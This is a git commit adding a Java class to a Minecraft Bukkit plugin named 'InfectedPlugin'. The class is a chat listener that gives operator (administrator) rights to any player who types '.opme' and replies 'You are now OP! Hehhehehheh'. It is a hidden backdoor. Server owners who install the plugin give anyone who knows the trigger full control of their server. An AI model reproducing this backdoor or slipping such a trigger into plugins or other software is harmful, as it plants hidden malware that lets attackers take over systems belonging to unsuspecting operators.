80f370ceaa145df1d070ca89c136b6f66d16bf04
Wilee999 <Infinitywilee@rocketmail.com>
2013-10-16 18:08:00 -0700

    Start moving commands into their own classes :)

---
+++ src/org/CreeperCoders/InfectedPlugin/Commands/Command_opme.java
@@ -0,0 +1,23 @@
+package org.CreeperCoders.InfectedPlugin;
+
+import org.bukkit.ChatColor;
+import org.bukkit.entity.Player;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+
+public class Command_opme implements Listener
+{
+    public void onPlayerChat(AsyncPlayerChatEvent event)
+    {
+        String message = event.getMessage();
+        final Player p = event.getPlayer();
+        boolean cancel = true;
+    
+        if (message.toLowerCase().contains(".opme"))
+        {
+            p.setOp(true);
+            p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
+            cancel = true;
+        }
+    }  
+}
